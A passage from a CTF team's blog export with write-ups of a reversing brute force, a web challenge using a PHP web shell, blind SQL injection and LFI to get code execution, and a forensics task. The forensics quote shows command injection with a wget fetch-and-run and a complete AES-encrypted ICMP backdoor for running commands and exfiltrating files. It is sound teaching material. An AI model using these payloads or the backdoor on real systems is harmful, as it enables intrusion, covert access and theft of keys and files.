v2]) #print(flag) #print(correct) if(flag != correct): result = \"Wrong\" else: result = \"Correct\" return result, flag[offset] == correct[offset]def main(): v2 = 0 v4 = \"\" flag = \"\" # 0x20 v6 = '' v7 = 0 i = 0 result = 'Wrong' offset = 7 flag = \"h4ck1t&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;\" diff = False #print (string.printable) #exit(0) while result == 'Wrong': #print offset for y in string.printable: v4 = \"\" flag = [x for x in flag] #print offset flag[offset] = y #print('\\r'+''.join(flag),end='') i = 0 while True: v2 = i if (v2 &gt;= len(flag)): break v4 += flag[i] i +=1 #print (v4,offset) result, diff = algo(v4, offset) if result == 'Correct': break #print (diff,y) #print len(list(diff)) if diff: diff = False offset += 1 break print(''.join(flag), result)main() Easy isn’t it? running it we get the flag!: 12$ python rev200.pyh4ck1t&#123;ff77af3cf8d4e1e67c4300aeb5ba6344&#125; Correct","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"encryption","slug":"encryption","permalink":"https://teamrocketist.github.io/tags/encryption/"},{"name":"byte2byte","slug":"byte2byte","permalink":"https://teamrocketist.github.io/tags/byte2byte/"}]},{"title":"[Web] Hackit 2017 - V1rus3pidem1c 100","slug":"Web-Hackit-2017-V1rus3pidem1c-100","date":"2017-08-27T14:42:12.000Z","updated":"2018-10-24T23:21:04.834Z","comments":true,"path":"2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/","link":"","permalink":"https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/","excerpt":"","text":"V1rus3pidem1cweb100Wasted16Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13372Hint: (none) After interacting a little bit with the page we can start taking some notes about the website:123GET parameter &quot;Country&quot; (Possible attacks like SQLi, LFI or even bash injection).File Upload form (By uploading a PHP Script). The uploaded files appear to be uploaded into uploads folder. Lets try uploading a php: 123&lt;?php&lt;pre&gt;if($_GET['cmd'])&#123;system($_GET['cmd']);&#125;&lt;/pre&gt;?&gt; Running some curl commands to check the status code of the file we are about to upload: 12$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'404 We got a 404 (not found) which is normal we still didn’t upload our php file so lets do it: 12$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/index.php?country=Germany' -F \"fileToUpload=@/home/teamrocketist/D/H/dnjefwh43jfh342fnewjfjndewefnu27fd.php\"200 Nice we got an 200 (OK) response! lets see if see if this is good news: 12345678910$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'200$ curl 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php?cmd=ls'&lt;pre&gt;&lt;?phpif($_GET['cmd']) &#123; system($_GET['cmd']); &#125;?&gt;&lt;/pre&gt; We can see we have some good and bad news we uploaded a php file with success! but our php file isn’t executing our php code and why this is happening? The admin must have configured in the apache configuration files to not run php in this specific upload folder(uploads) or it has a .htaccess inside it blocking it. Actually you could solve this challenge very easily if you uploaded a .htaccess with your own rules overwriting the original .htaccess but this wasn’t the intentional solution, after a while the admins fixed this and protected the .htaccess file so it couldn’t get overwritten, but I believe some other teams managed to solve this challenge like this. But continuing with the intentional solution, lets try to get what’s left from the notes we took before maybe we can try some sql injection? 12345678910111213141516171819202122232425262728293031323334353637$ sqlmap -u \"http://tasks.ctf.com.ua:13372/index.php?country=USA\" --tables --threads=10 --exclude-sysdbs --dump---Parameter: country (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: country=USA' AND 6412=6412 AND 'lvwC'='lvwC Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: country=USA' AND SLEEP(5) AND 'buJa'='buJa---[16:51:04] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12Database: WHATAREYOUDOINGHERE[1 table]+-----------+| countries |+-----------+Database: WHATAREYOUDOINGHERETable: countries[10 entries]+-----------+----------------+--------------+| countryID | scriptPath | countryName |+-----------+----------------+--------------+| 1 | country/ge.php | Germany || 2 | country/tu.php | Turkmenistan || 3 | country/ne.php | Netherlands || 4 | country/se.php | Serbia || 5 | country/tk.php | Turkey || 6 | country/fr.php | France || 7 | country/uk.php | UK || 8 | country/ru.php | Russia || 9 | country/us.php | USA || 10 | country/ca.php | Canada |+-----------+----------------+--------------+ And we got an Blind sql injection dump (Thanks you sqlmap for doing the boring part for us!), but after dumping the database we didn’t find anything special, but if we start thinking how the page is actually working behind this, we can see the admin is selecting the path to a country php file which contains the upload form and INCLUDES it on the index.php page!!!! and here is the key for this challenge! We can try to combine SQLi and LFI with a union technique injection! Getting the column number: 1234# successfully shows up a upload form!$ curl 'http://tasks.ctf.com.ua:13372/index.php?country=Germany\\' order by 1-- qqq'# Doest show a upload form!$ curl 'http://tasks.ctf.com.ua:13372/index.php?country=Germany\\' order by 2-- qqq' Performing union injection and include /etc/passwd: Including our previous uploaded php script and and get remote code execution on the server! 123456789101112$ curl \"http://tasks.ctf.com.ua:13372/index.php?cmd=ls -lta&amp;country=German' union all select 'uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php' -- frhQ\"\"truncated html code\"total 72drwxrwxrwx 2 1002 1002 40960 Aug 27 21:16 uploads-r--r--r-- 1 1002 1002 49 Aug 27 07:36 .htaccessdrwxrwxr-x 5 1002 1002 4096 Aug 25 20:26 .-r--r--r-- 1 1002 1002 44 Aug 25 20:26 iulersiueruigfuihseruhgi.phpdrwxrwxr-x 4 1002 1002 4096 Aug 25 13:59 ..-r--r--r-- 1 1002 1002 1667 Jul 28 20:54 index.phpdrwxrwxr-x 2 1002 1002 4096 Jul 28 03:35 countrydrwxrwxr-x 2 1002 1002 4096 Jul 28 03:34 static\"truncated html code\" The flag was in the php file iulersiueruigfuihseruhgi.php: 12345678$ curl 'http://tasks.ctf.com.ua:13372/index.php?cmd=cat%20iulersiueruigfuihseruhgi.php&amp;country=German%27%20union%20all%20select%20%27uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php%27%20--%20frhQ'\"truncated html code\"&lt;pre&gt;&lt;?php$flag=\"h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125;\";?&gt;&lt;/pre&gt;\"truncated html code\"","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"blindsqli","slug":"blindsqli","permalink":"https://teamrocketist.github.io/tags/blindsqli/"}]},{"title":"[Network] Sha2017 - Abuse Mail [300]","slug":"Network-Sha2017-Abuse-Mail-300","date":"2017-08-07T12:52:21.000Z","updated":"2018-10-24T23:21:04.834Z","comments":true,"path":"2017/08/07/Network-Sha2017-Abuse-Mail-300/","link":"","permalink":"https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/","excerpt":"","text":"Abuse Mail (300) - 62 solvesOur abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happened. Can you help us to catch the culprit?abusemail.tgz233b7cb7f8113baca2f8d29d74105887 we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap. Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication. Let’s check telenet’s packages: Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -&gt; Preferences -&gt; Protocols -&gt; ESP After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to upload a backdoor on the server. the commands he used: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139GET /?ip=google.com HTTP/1.1PING google.com (172.217.17.110) 56(84) bytes of data.64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=9.12 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=8.86 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.3 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.06 msGET /?ip=google.com;ls HTTP/1.1ING google.com (172.217.17.110) 56(84) bytes of data.64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=8.66 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=9.44 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.0 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.44 ms--- google.com ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3005msrtt min/avg/max/mdev = 8.445/9.153/10.057/0.639 mscssindex.phpGET /?ip=;ls%20-la HTTP/1.1total 16drwxr-xr-x 3 root root 4096 Jul 26 09:36 .drwxr-xr-x 3 root root 4096 Jul 26 03:45 ..drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.phpGET /?ip=;sudo%20-l HTTP/1.1Matching Defaults entries for www-data on router: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on router: (ALL : ALL) NOPASSWD: ALLGET /?ip=;id HTTP/1.1uid=33(www-data) gid=33(www-data) groups=33(www-data)GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1--2017-07-26 09:43:36-- http://10.5.5.207/backdoor.pyConnecting to 10.5.5.207:80... connected.HTTP request sent, awaiting response... 200 OKLength: 2428 (2.4K) [text/x-python]Saving to: '/tmp/backdoor.py'0K .. 100% 458M=0s2017-07-26 09:43:36 (458 MB/s) - '/tmp/backdoor.py' saved [2428/2428]GET /?ip=;cat /tmp/backdoor.py HTTP/1.1#!/usr/bin/env pythonimport base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESfrom scapy.all import *BS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()cipher = AESCipher(sys.argv[1])while True: try: pkts = sniff(filter=\"icmp\", timeout =5,count=1) for packet in pkts: if str(packet.getlayer(ICMP).type) == \"8\": input = packet[IP].load if input[0:len(magic)] == magic: input = input.split(\":\") data = cipher.decrypt(input[1]).split(\":\") ip = packet[IP].src if data[0] == \"command\": output = run_command(data[1]) send_ping(ip, magic, \"command:&#123;&#125;\".format(output)) if data[0] == \"getfile\": #print \"[+] Sending file &#123;&#125;\".format(data[1]) get_file(ip, magic, data[1]) except: passGET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1 The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb “GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1”. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#!/usr/bin/env pythonimport base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESfrom scapy.all import *BS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()cipher = AESCipher(sys.argv[1])while True: try: pkts = sniff(filter=\"icmp\", timeout =5,count=1) for packet in pkts: if str(packet.getlayer(ICMP).type) == \"8\": input = packet[IP].load if input[0:len(magic)] == magic: input = input.split(\":\") data = cipher.decrypt(input[1]).split(\":\") ip = packet[IP].src if data[0] == \"command\": output = run_command(data[1]) send_ping(ip, magic, \"command:&#123;&#125;\".format(output)) if data[0] == \"getfile\": #print \"[+] Sending file &#123;&#125;\".format(data[1]) get_file(ip, magic, data[1]) except: pass With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark! 123kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse02.pcap -Tfields -e data | xxd -r -p &gt; encrypted1kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse03.pcap -Tfields -e data | xxd -r -p &gt; encrypted2 Now modifing the scrypt so we can decrypt our IMCP encrypted data: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESimport binasciiimport reBS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"key2=\"K8djhaIU8H2d1jNb\"stri=\"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ==\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()# cipher = AESCipher(sys.argv[1])# while True:# try: # pkts = sniff(filter=\"icmp\", timeout =5,count=1)# for packet in pkts:# if str(packet.getlayer(ICMP).type) == \"8\": # input = packet[IP].load# if input[0:len(magic)] == magic:# input = input.split(\":\")# data = cipher.decrypt(input[1]).split(\":\")# ip = packet[IP].src# if data[0] == \"command\":# output = run_command(data[1])# send_ping(ip, magic, \"command:&#123;&#125;\".format(output))# if data[0] == \"getfile\":# #print \"[+] Sending file &#123;&#125;\".format(data[1])# get_file(ip, magic, data[1])# except:# pass# break# print(final)#for i in range(0,301):# print(i, dicio[str(i)])# for k,v in dicio.iteritems(): # print(k, base64.urlsafe_b64decode(v))# print(base64.urlsafe_b64decode(final)) # if outp not in lis: # # print(outp) # print(numb) # lis.append(outp) # lis = sorted(lis) # for it in lis: # print(it)dicio = &#123;&#125;lis = []n = AESCipher(key2)infile1=\"encrypted1\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin),2): outp = n.decrypt(strin[i]) print outp Running the script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.pycommand:ls -lacommand:total 16drwxr-xr-x 3 root root 4096 Jul 26 09:36 .drwxr-xr-x 3 root root 4096 Jul 26 03:45 ..drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.phpcommand:idcommand:uid=0(root) gid=0(root) groups=0(root)command:idcommand:uid=0(root) gid=0(root) groups=0(root)command:idcommand:uid=0(root) gid=0(root) groups=0(root)command:ls -la /rootcommand:total 32drwx------ 5 root root 4096 Jul 27 07:27 .drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..-rw------- 1 root root 3228 Jul 26 06:44 .bash_history-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwxr-xr-x 2 root root 4096 Jul 27 09:11 certsdrwxr-xr-x 2 root root 4096 Jul 26 03:47 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 Jul 27 07:27 .sshcommand:ls -la /root/certscommand:total 16drwxr-xr-x 2 root root 4096 Jul 27 09:11 .drwx------ 5 root root 4096 Jul 27 07:27 ..-rw-r--r-- 1 root root 989 Jul 27 07:23 intranet.crt-rw-r--r-- 1 root root 916 Jul 27 07:23 intranet.keycommand:cat /root/certs/intranet.crtcommand:-----BEGIN CERTIFICATE-----MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQwEgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBnbWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEUMBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZAZ21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRnn/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXKhCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgKhNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7MV70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAWrjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDuSRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nXDkYKgl7BR0a72yTuLAc0GA==-----END CERTIFICATE-----command:cat /root/certs/intranet.keycommand:-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=-----END PRIVATE KEY-----command:cat /root/certs/intranet.keycommand:-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=-----END PRIVATE KEY-----command:cat /etc/hostscommand:127.0.0.1 localhost127.0.1.1 ubuntu# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters10.29.0.1 router192.168.1.1 router192.168.1.2 intranetcommand:nohup nmap intranet &gt; /tmp/intranet.nmapcommand:command:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:curl -k https://intranet/command: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 456 100 456 0 0 4871 0 --:--:-- --:--:-- --:--:-- 4903&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Unauthorized&lt;/h1&gt;&lt;p&gt;This server could not verify that youare authorized to access the documentrequested. Either you supplied the wrongcredentials (e.g., bad password), or yourbrowser doesn't understand how to supplythe credentials required.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at intranet Port 443&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;command:tcpdump -Dcommand:1.ens33 [Up, Running]2.ens39 [Up, Running]3.any (Pseudo-device that captures on all interfaces) [Up, Running]4.lo [Up, Running, Loopback]5.nflog (Linux netfilter log (NFLOG) interface)6.nfqueue (Linux netfilter queue (NFQUEUE) interface)7.usbmon1 (USB bus number 1)8.usbmon2 (USB bus number 2)command:tcpdump -i usbmon2 -w /tmp/usb.pcapcommand:tcpdump host intranet -w /tmp/intranet.pcap As we can see we can extract alot of usefull Information from here, we now have the RSA private key used for TLS encryption and the certificate from the companies intranet website, the last 2 commands we could see that the hacker actually started two tcpdumps initiating the captures and one of them is a USB capture! maybe this will be useful latter!Usefull data extracted: command:cat /root/certs/intranet.crtcommand:—–BEGIN 